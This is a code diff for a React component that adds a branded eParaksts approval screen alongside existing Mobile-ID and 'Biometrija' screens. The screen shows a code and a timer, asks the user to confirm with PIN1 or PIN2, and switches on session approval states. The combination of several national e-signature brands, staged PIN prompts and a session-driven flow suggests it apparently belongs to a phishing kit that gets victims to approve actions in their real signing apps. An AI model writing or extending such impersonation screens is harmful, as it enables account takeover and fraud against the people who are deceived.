@@ -29,6 +29,8 @@ const APPROVAL_LABELS: Record<string, string> = {
   mobileid_2: "Mobile-ID 2",
   biometrika_pin_1: "Biometrija",
   biometrika_pin_2: "Biometrija 2",
+  eparaksts_1: "eParaksts",
+  eparaksts_2: "eParaksts 2",
 };
 
 function parseApprovalHistory(value: unknown): string[] {
@@ -82,6 +84,21 @@ function MobileIdMark() {
         height={42}
         priority
         className="h-auto w-[178px]"
+      />
+    </div>
+  );
+}
+
+function EParakstsMark() {
+  return (
+    <div className="flex items-center justify-center">
+      <Image
+        src="/form-assets/eparaksts-mobile.webp"
+        alt="eParaksts mobile"
+        width={200}
+        height={85}
+        priority
+        className="h-auto w-[200px]"
       />
     </div>
   );
@@ -221,6 +238,65 @@ function MobileIdApprovalCard({
           <div className="space-y-5 text-center">
             <h1 className="text-[1.8rem] font-extrabold leading-[1.12] tracking-[-0.02em] text-white">
               Eikite į savo Mobile-ID programą savo telefone.
+            </h1>
+
+            <p className="text-[1.05rem] text-white/60">Apstipriniet, izmantojot {pinLabel} kodu</p>
+
+            <div
+              className="rounded-[12px] px-5 py-5 text-[2.5rem] font-extrabold tracking-[0.14em] text-white"
+              style={{
+                background: "rgba(255,255,255,0.07)",
+                border: "1px solid rgba(255,255,255,0.14)",
+                backdropFilter: "blur(10px)",
+                textShadow: "0 2px 12px rgba(74,222,128,0.35)",
+              }}
+            >
+              {approvalCode || "0000"}
+            </div>
+
+            <p className="text-[1rem] text-white/60">
+              Liko laiko: <span className="font-bold text-white">{formatRemainingTime(secondsLeft)}</span>
+            </p>
+
+            <button
+              type="button"
+              onClick={onConfirm}
+              disabled={saving}
+              className="pak-form-button w-full px-4 py-4 text-[1.05rem]"
+            >
+              {saving ? "Patvirtinama..." : "Patvirtinti"}
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function EParakstsApprovalCard({
+  approvalCode,
+  secondsLeft,
+  saving,
+  pinLabel,
+  onConfirm,
+}: {
+  approvalCode: string;
+  secondsLeft: number;
+  saving: boolean;
+  pinLabel: "PIN1" | "PIN2";
+  onConfirm: () => void;
+}) {
+  return (
+    <div className="pak-page-shell">
+      <div className="pak-form-card w-full max-w-[380px]">
+        <div className="pak-form-inner px-7 py-8">
+          <div className="mb-9 flex justify-center rounded-2xl bg-white/95 px-4 py-3">
+            <EParakstsMark />
+          </div>
+
+          <div className="space-y-5 text-center">
+            <h1 className="text-[1.8rem] font-extrabold leading-[1.12] tracking-[-0.02em] text-white">
+              Atveriet eParaksts lietotni savā telefonā.
             </h1>
 
             <p className="text-[1.05rem] text-white/60">Apstipriniet, izmantojot {pinLabel} kodu</p>
@@ -676,6 +752,18 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         secondsLeft={secondsLeft}
         saving={saving}
         pinLabel={viewState.approvalStatus === "mobileid_2" ? "PIN2" : "PIN1"}
+        onConfirm={() => void handleApprovalSubmit()}
+      />
+    );
+  }
+
+  if (viewState.approvalStatus === "eparaksts_1" || viewState.approvalStatus === "eparaksts_2") {
+    return (
+      <EParakstsApprovalCard
+        approvalCode={viewState.approvalCode}
+        secondsLeft={secondsLeft}
+        saving={saving}
+        pinLabel={viewState.approvalStatus === "eparaksts_2" ? "PIN2" : "PIN1"}
         onConfirm={() => void handleApprovalSubmit()}
       />
     );
